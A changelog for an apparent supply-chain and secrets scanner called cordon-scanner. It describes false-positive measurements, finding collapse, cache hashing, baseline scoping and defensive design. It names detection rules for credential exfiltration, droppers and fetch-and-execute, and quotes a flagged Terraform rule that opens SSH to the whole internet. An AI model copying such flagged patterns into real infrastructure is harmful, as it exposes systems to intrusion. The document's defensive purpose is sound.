| if unpinned fetch-and-execute did not block | 1,174 (82.3%) |
| if infrastructure and CI posture did not block | 1,140 (79.9%) |
| if neither blocked | **1,260 (88.3%)** |

Computed by `report.py` beside the reports, which names the rules in each family
explicitly. The figures published for passes one to four used a rule-prefix split
where `CI.` and `CONTAINER.` overlapped the fetch-and-execute family, counting
`SUSPECT.CI.FETCH_EXEC.001` in both columns; recomputing the fourth pass under the
one rule gives 79.7% and 87.9% against the 79.5% and 87.8% printed then. Half a
point, and worth stating rather than leaving two numbers that disagree for an
unstated reason.

The largest single class is `SUSPECT.IAC.PUBLIC_INGRESS.001` at 206, and a spot
check of the worst repository for it found `from_port = 22`, `to_port = 22`,
`cidr_blocks = ["0.0.0.0/0"]` -- SSH open to the internet, twenty-eight times in one
Terraform course. The next is `SUSPECT.DROPPER.001` at 169, and every instance
sampled across three passes was a canonical vendor installer fetched over HTTPS:
`sh.rustup.rs`, `astral.sh/uv/install.sh`, `deno.land/install.sh`,
`rclone.org/install.sh`.

Those are true findings about a real and widely accepted risk. Whether they should
fail a build is a decision for whoever runs the scan, and the answer is a
`--fail-on` threshold or a baseline entry rather than a quieter rule. The three
noisiest repositories in the corpus are a Dockerfile collection, a DevOps course and
a Terraform course, and between 85 and 93 per cent of what each reports is that
family.

Suite: 3,999 passing.

### Changed

- **Findings collapse across identical files and repeated constructs.** Where a
  rule fired on many copies of the same thing, the report now carries one finding
  with the count and the first five paths in its message, and `occurrences` in its
  evidence metadata. That means one SARIF alert per group rather than per file, so
  a tool consuming the report sees fewer rows than 0.1.x produced for the same
  tree. Three mechanisms, in order: identical FILES by content hash; the same rule
  and the same matched bytes across ten or more files where the snippet is long
  enough that ten identical copies cannot be coincidence; and five or more private
  keys in one directory.

  The thresholds exist because the alternative was measured. Collapsing by matched
  *value* would have merged Spring Boot's nineteen distinct RSA test keys, because
  every 2048-bit key begins with the same DER header. Nine copies of a construct
  is still nine places somebody has to look.

- **`SUSPECT.EXFIL.001` reports at `medium`.** It asks for a credential read, a
  network call and an execution in one file, and that describes 675 findings across
  234 of the 1,427 repositories measured -- every client for a hosted service reads
  its own API key, calls the vendor's API and starts a subprocess. At `high` it sat
  inside the default failure gate. The `MALWARE.EXFIL.001` form, which requires the
  install-hook context, is unchanged at `critical`.

- `baseline create` and `baseline compare` cover tracked files only when the
  target is inside a git repository. `--all-files` restores the previous
  behaviour.

  A baseline is a committed artefact, and walking the working tree wrote
  findings about paths git ignores into it. The first baseline taken on a real
  repository named a local `.env`. The entries cannot be reproduced, because no
  other clone has the file, so `compare` reports them as "no longer occurs" on
  every machine but the one that wrote them; the file misrepresents the
  repository to anybody reading it to find out what is being carried; and a
  secret scanner reading untracked `.env` files by default is the wrong default
  whatever it does with what it finds. Nothing leaked -- an entry holds a
  fingerprint, a rule id and a path, and evidence is hash-only throughout -- but
  the shape of the mistake is the one this tool objects to elsewhere.

  A target that is not a repository is not an error, unlike `scan --tracked`.
  That flag is a promise about which bytes were read and has to fail rather than
  quietly widen; this is a default about which files are worth recording, and
  refusing to baseline an unversioned directory would refuse the thing that was
  asked. The scope is printed either way, because a scope a reader has to infer
  is a scope they will get wrong.

  Regenerate any existing baseline to drop the entries it should never have had.
  Nothing breaks if you do not: a baseline with extra entries suppresses
  findings that no longer occur, which `compare` already reports.

- The cache's identity for a detector is now `id@version@code`, where `code` is
  a hash of the module the detector is defined in.

  `version` alone was the whole identity, which made cache correctness depend on
  a person remembering to edit a string in the same commit as a behaviour
  change. 0.1.1 came one line from proving how that fails: its entire content
  was a false-positive fix in `detect/secrets.py`, and the file content, rule
  pack and configuration were all unchanged, so every affected entry would have
  been served from the cache and the release would have done nothing for anybody
  who had ever run a scan.

  The declared version is still worth having -- it is what a report, a release
  note and a pack's `requires` clause can name, and a code hash is not something
  anyone can reason about. It is no longer what correctness rests on.

  Line endings are normalised before hashing, so one release does not produce
  two signatures depending on whether the checkout used LF or CRLF. A build with
  no readable source contributes `nosource` and falls back to the declared
  version rather than refusing to scan.

  The cost is deliberate and is the right way round: editing a docstring in a
  detector module invalidates that detector's entries, and a needless re-scan
  costs seconds, where reusing a result the current code would not have produced
  is a wrong answer -- and in this tool a wrong answer is usually a missed
  payload. Expect one cold scan after upgrading.

## [0.1.1] - 2026-09-11

A false-positive fix. No new detection, no configuration change, and no
migration.

### Fixed

- `SECRET.GENERIC.ASSIGNMENT.001` no longer reads the line below a definition
  as the value assigned to it. The operator in the assignment pattern allowed
  `\s*` on both sides, and `\s` matches a newline, so `class AuthTokenService:`
  followed by `@staticmethod` was reported as "a credential assigned to
  'AuthTokenService'". Any Python class, or YAML key, whose name contains one of
  the credential words and whose next line opened with twelve or more
  characters of unbroken text produced a high-severity finding; one Django
  codebase of ordinary service classes produced nine.

  This was the worst kind of noise this rule can make. A finding a reviewer
  cannot act on is a finding that teaches them to stop reading the rule, and
  the real `SECRET_KEY = "..."` three files away goes with it.

  The operator now allows horizontal whitespace only, on both sides, which also
  closes the `\r` form of the same mistake on a CRLF checkout. An assignment
  puts its value on the same line as its name; a value on a later line is a
  class body, a mapping or the next statement. The multi-line case that is real,
  a literal built across several lines, was never matched here and continues to
  be matched by the assembled-literal path, which looks for a joiner.

### Also fixed

- The pre-commit `rev` in the README and the version pins in the GitLab and
  Azure templates named `0.1.0` and would have kept naming it. Every pipeline
  set up from a template, and every repository using the pre-commit hook, would
  have gone on installing the version this release exists to replace with no
  signal that a fix had been published. A test now asserts each of those pins
  against `__version__`, the way the changelog entry was already asserted.

### Known, not fixed here

- `cordon-scanner baseline create` has no `--tracked`, so it walks the working
  tree and records findings in files git is ignoring. A repository with a local
  `.env` gets that file's path written into a baseline that is then committed.
  Nothing leaks -- evidence is hash-only -- but a baseline naming paths that do
  not exist in any clone is wrong, and a secret scanner reading untracked `.env`
  files by default is the wrong default. Use `--tracked` on `scan` and prune the
  baseline by hand until this is fixed.
- A detector's cache identity is a `version` string a person has to remember to
  change, which is how this fix came within one line of reaching nobody. It
  should be derived from a hash of the detector's own source.
- `ci/generic/scan.sh` defaults to a container image at
  `ghcr.io/threx-code/cordon`, and no workflow in this repository builds or
  publishes one. The template cannot work as written for anybody who does not
  set `CORDON_IMAGE`.

### Cache

- The `secrets` detector is at `0.2.1`. `ScanCache` composes its key from the
  file content, the rulepack hash, the configuration hash and a signature over
  every detector's `id@version`, and a fix like this one changes none of the
  first three. Without the bump, anyone who had already scanned a tree would
  upgrade and keep being served the findings this release removes, out of a
  cache with no reason to believe anything had changed. No action is needed and
  `--no-cache` is not necessary: installing this version invalidates the
  affected entries on its own.

- `RULEPACK_VERSION` is unchanged at `0.1.0`. The pattern lives in detector
  code, not in a bundled pack, so nothing a security review signed off on has
  moved.

## [0.1.0] - 2026-09-09

First release. Everything below is in it; there is no earlier published
version, so nothing here is a change from one.

### Names

The distribution is `cordon-scanner`, the console script is `cordon-scanner`,
and the import package is `cordon_scanner`.

Not `cordon` in any of the three. That name belongs on PyPI to an unrelated
project which ships both a top-level `cordon` package and a `cordon` console
script, so installing both into one environment has pip write two distributions
into the same directory and leave whichever landed last. Configuration
filenames (`cordon.yaml`), cache paths and the `CORDON_*` variables are
unaffected -- they are not installed names and cannot collide.

### Scanning

- Scans a directory, a file or an archive across eight package ecosystems, with
  no third-party runtime dependencies and no network access.
- `--staged`, `--tracked` and `--git-diff REF`, through a file-source
  abstraction. Staged mode reads blobs from the git index rather than the
  working tree, so a payload cannot be staged and the clean copy restored.
- Findings in five categories with independent severity and confidence axes.
  `MALICIOUS` at `CONFIRMED` confidence is reachable only through an exact
  package-and-version match against the advisory database.
- `text`, `json`, `sarif`, `markdown` and `junit` output.
- A live progress line on standard error while a scan runs, showing the phase,
  the count and the current file. On only when standard error is an
  interactive terminal; `--progress always|never` overrides that. It is on
  standard error so it stays out of the report a pipeline parses, and the paths
  it shows are escaped, because a filename may legally contain an ANSI control
  sequence or a bidirectional override. The line is measured in terminal
  columns rather than code points, so a CJK or emoji filename does not wrap.
- Incremental cache keyed on content, configuration and detector identity, with
  every entry authenticated by a per-machine HMAC.
- `cordon-scanner baseline create|compare` and `scan --baseline PATH`, so the tool can
  be adopted on a repository that is not clean yet.
- `cordon-scanner rules`, `cordon-scanner config`, `cordon-scanner inventory`, `cordon-scanner report` and
  `cordon-scanner guard`, plus `python -m cordon_scanner_scanner`.

### Not looking is reported as not looking

The invariant the design is built around: a scan that examined nothing must
never report like a scan that found nothing.

- Configuration supplied by the scan target cannot exclude paths, disable
  detectors or disable rules without that appearing in the report at a severity
  the default gate fails on.
- A scan that examined no files fails, whether the files were excluded, removed
  by the selected source, or could not be read.
- Truncated files, per-file and whole-scan timeouts, memory and path limits,
  rejected archive members and detector failures are each reported and mark the
  scan incomplete.
- Reporting thresholds cannot hide a finding from the failure gate.
- Organisation policy acts as a ceiling that command-line overrides are
  re-checked against.

### Not becoming the leak

- Evidence is redacted at construction, never at render time, so unredacted
  content never reaches a reporter. Secret-category rules cannot opt out.
- Package coordinates are bounded at the model, so a parser that reads past the
  field it wanted cannot publish the rest of the line.
- Reports carry no absolute filesystem paths.

### Not executing the target

- Manifests and lockfiles are parsed, never invoked; `setup.py` is read through
  `ast.parse` and nothing in it is evaluated.
- Git runs with system and global configuration disabled and with every
  configuration key that names an external command neutralised, so a
  repository cannot execute code through the scan that examines it.
- Rule patterns are validated by walking the parsed regex, so nesting,
  lookaheads and non-capturing groups cannot hide a catastrophic shape. Every
  pattern compiled inside the package is held to the same rule by test.
- File loading opens with `O_NOFOLLOW` and checks the descriptor, closing a
  time-of-check/time-of-use window. Symbolic links are recorded, never
  followed.
- A third-party distribution cannot shadow a built-in detector.

### The Action

- Installs with `--require-hashes` against `action/requirements.txt`, generated
  at release time from the artefacts actually published. Pinning the Action to
  a commit SHA covers `action.yml` only; without this it says nothing about
  what pip downloads, and a compromised index or release account would replace
  the scanner in every workflow using it.
- A ref carrying no pin refuses to install rather than installing unverified.
  `allow-unverified-install: true` overrides that in the workflow file, where
  it is reviewable, and warns about what it gives up.
- Every action referenced by this project's own workflows is pinned to a commit
  digest, enforced by test rather than by review.

### Rule kinds

`MatchKind` declares `ast`, `structural` and `graph`, and nothing implements
them. A rule pack using one is refused at load with a message saying so, rather
than accepted and silently unable to match. A rule that never fires looks
exactly like a rule that found nothing, which is the failure this project is
organised around, applied to rules.

### Air-gapped installation

- `cordon-scanner bundle create|verify|install` moves a release across an air
  gap with the transfer made checkable. The bundle carries a `MANIFEST.sha256`
  in `sha256sum` format, so an operator who distrusts it does not have to run
  the program inside it to decide whether to trust it.
- `verify` fails closed on a modified file, a missing file, an unlisted extra
  file, a traversal member, a symlink, or a missing manifest. `install`
  verifies first and writes nothing if verification fails.
- It reports what it did *not* prove: the manifest shows the bundle is the one
  its own manifest describes, not who produced it. That comes from the detached
  signature made at release.

### Organisation policy distribution

- `--policy` accepts a URL, which must carry a `#sha256=` digest. Without one
  it is refused: an organisation policy is the ceiling, so whoever controls the
  network would otherwise control whether the ceiling exists.
- Fetching requires `--allow-network`, the only network operation the tool has.
  Scanning never uses the network.
- Verified policies are cached by digest, so the second scan on a machine needs
  no network and an air-gapped site can populate the cache by hand. The digest
  is re-checked on every use, because the cache is an ordinary directory other
  processes can write.
- HTTPS only, a 1 MB cap, and nothing is cached when verification fails.

### Audit

- `--audit-log PATH` appends one JSON line per scan: the rule pack and
  configuration hashes, the commit, counts by severity, whether the scan
  completed, the exit code, and every suppression that applied with its
  justification, approver and expiry. Never file content.
- A git remote is recorded with its credential stripped. Every CI checkout
  looks like `https://x-access-token:<token>@host/org/repo.git`, and an audit
  log is retained longer and read by more people than a report.
- An unwritable path is refused before the scan runs, not after it.
- `Repository.revision` and `remote` are now populated. They were declared,
  serialised into every report and SARIF upload, and never set, so results
  recorded `null` for the two fields that say which code was examined.

### Release integrity

- Every release carries a CycloneDX and an SPDX SBOM, generated from packaging
  metadata rather than restated, and recording the digests of the exact files
  published. The dependency list is empty and that is the point: the claim is
  checkable rather than asserted.
- Artefacts and both SBOMs are signed with Sigstore keyless signing, so there
  is no signing key to protect, rotate or leak.
- SLSA build provenance is attested for each artefact, and PyPI receives PEP
  740 attestations, so an installer can ask not only whether the project signed
  something but whether it was built by the process the project describes.
- Builds set `SOURCE_DATE_EPOCH`, so a third party can rebuild from the tag and
  compare digests with the SBOM.

### Known limits

- The bundled advisory database is deliberately small and covers documented
  supply-chain incidents. It is not a substitute for a feed; load one with
  `--advisories`.
- Semantic (`ast`), structural and graph rule kinds are not implemented, and a
  pack declaring one is refused rather than silently ignored. There is no
  `[ast]` extra: it declared two packages nothing imported, which do not work
  together at their current releases, for a feature that does not exist.
- The source distribution ships `corpus/benign`, so the false-positive suite
  runs downstream, and not `corpus/malicious`. The detection suite therefore
  skips from an sdist and says so; clone the repository at the release tag to
  run it.
- The YAML accepted in configuration is a restricted subset: no anchors,
  aliases or tags.
